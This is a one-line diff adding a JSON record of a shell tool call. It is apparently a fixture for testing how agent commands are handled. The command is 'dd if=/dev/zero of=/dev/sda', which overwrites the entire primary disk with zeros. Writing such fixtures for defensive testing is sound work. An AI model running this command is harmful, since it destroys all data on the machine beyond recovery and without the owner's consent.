@@ -1,0 +1,1 @@
+{"tool":"shell","cmd":"dd if=/dev/zero of=/dev/sda bs=512","cwd":"/test"}
